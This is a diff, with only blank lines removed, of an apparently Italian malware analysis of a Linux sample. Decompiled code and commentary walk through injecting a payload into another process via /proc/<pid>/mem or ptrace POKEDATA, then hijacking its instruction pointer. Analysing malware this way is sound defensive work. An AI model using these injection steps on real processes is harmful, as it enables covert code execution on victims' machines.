@@ -102,7 +102,6 @@ if ( method )
         ptrace_write_and_redirect_execution(target_pid, payload, payload_size);
 }
 
-
 _Selettore_Method:
 
 <img src="https://spaghetti-hacker.github.io/qlnx_tab3.png" class="full-img">
@@ -110,7 +109,6 @@ _Selettore_Method:
 section .FALLBACK_MECHANISM
 
 ;quando il metodo non viene specificato (method == 0), il malware tenta automaticamente la tecnica preferenziale e passa alla seconda in caso di errore.
-
 
 if ( method == 0 )
 {
@@ -128,7 +126,6 @@ if ( method == 0 )
     }
 }
 
-
 ;la modalita' automatica aumenta la compatibilita' del framework: il malware tenta prima <code>/proc/&lt;pid&gt;/mem</code> e utilizza ptrace come alternativa quando il primo metodo non e' disponibile. L'ordine dei controlli implementa una preferenza esplicita: <code>/proc/&lt;pid&gt;/mem</code> e' il canale primario, ptrace il canale di riserva.
 
 section .PROC_MEM_INJECTION
@@ -137,14 +134,11 @@ section .PROC_MEM_INJECTION
 
 <img src="https://spaghetti-hacker.github.io/qlnx1.png" class="full-img">
 
-
 if ( (unsigned int)ptrace_attach_and_wait(PID) == -1 )
     return 0xFFFFFFFFLL;
 mem_PID = read_mem_PID(PID);
 
-
 ;ptrace_attach_and_wait() sospende il processo remoto tramite PTRACE_ATTACH e attende che il target raggiunga uno stato di stop. Se l'attach fallisce (restrizioni Yama, permessi insufficienti), la funzione termina subito con errore. read_mem_PID() analizza <code>/proc/&lt;pid&gt;/maps</code> del target e individua l'area di memoria da usare come destinazione.
-
 
 if ( !mem_PID || ptrace(PTRACE_GETREGS, PID, 0LL, v15) < 0 || (v7 = malloc(v3)) == 0LL )
 {
@@ -152,21 +146,16 @@ if ( !mem_PID || ptrace(PTRACE_GETREGS, PID, 0LL, v15) < 0 || (v7 = malloc(v3)) 
     return 0xFFFFFFFFLL;
 }
 
-
 ;prima della scrittura vengono verificate tre condizioni: indirizzo di memoria valido, lettura registri riuscita (PTRACE_GETREGS), allocazione del buffer di backup riuscita. Se una fallisce, il processo viene rilasciato (PTRACE_DETACH) senza modifiche.
-
 
 pread(fd, backup, size, mem_PID);
 pwrite(fd, buffer, size, mem_PID);
 
-
 ;pread copia il contenuto originale della regione scelta in un buffer locale di backup. pwrite scrive il payload nella stessa regione. Se una delle due operazioni non restituisce la dimensione attesa, l'injection viene considerata fallita e il processo viene rilasciato senza toccare i registri.
-
 
 v17 = mem_PID;
 ptrace(PTRACE_SETREGS, PID, 0LL, v16);
 ptrace(PTRACE_DETACH, PID, 0LL, 0LL);
-
 
 ;v16 contiene la copia dei registri originali (letti con PTRACE_GETREGS) con il campo rip sovrascritto dall'indirizzo mem_PID. PTRACE_SETREGS applica questo stato al target, spostando il program counter sull'inizio del payload. PTRACE_DETACH rilascia il controllo e il processo riprende l'esecuzione dal nuovo rip.
 
@@ -175,7 +164,6 @@ section. PTRACE_INJECTION
 ;la seconda tecnica scrive nella memoria del processo remoto usando direttamente le primitive ptrace, senza passare da <code>/proc/&lt;pid&gt;/mem</code>.
 
 <img src="https://spaghetti-hacker.github.io/qlnx2.png" class="full-img">
-
 
 while ( indice < size )
 {
@@ -194,18 +182,15 @@ while ( indice < size )
     indice += 8;
 }
 
-
 ;la scrittura avviene in blocchi da 8 byte (su un sistema Linux x86_64 questa word è di 8 byte [long = 64 bit]), poiche' PTRACE_POKEDATA opera solo con questa granularita'. Quando restano meno di 8 byte, la funzione esegue prima una PTRACE_PEEKDATA per leggere il contenuto originale della word di destinazione, cosi' da preservare i byte non appartenenti al payload nell'ultimo blocco parziale. 
 
 section .EXECUTION_REDIRECT
 
 ;la fase finale delle due tecniche coincide: dopo la scrittura del payload il malware modifica il registro instruction pointer del processo remoto.
 
-
 v17[16] = mem_PID;
 ptrace(PTRACE_SETREGS, PID, 0LL, v17);
 ptrace(PTRACE_DETACH, PID, 0LL, 0LL);
-
 
 ;v17[16] corrisponde, nella struttura di registri x86_64 usata da ptrace, al campo rip. Impostandolo su mem_PID, il program counter del processo vittima viene fatto puntare all'inizio della regione appena scritta. PTRACE_SETREGS applica la struttura modificata, PTRACE_DETACH rilascia il controllo: il processo riprende l'esecuzione autonomamente, ma eseguendo il payload iniettato al posto del proprio codice originale. 
 
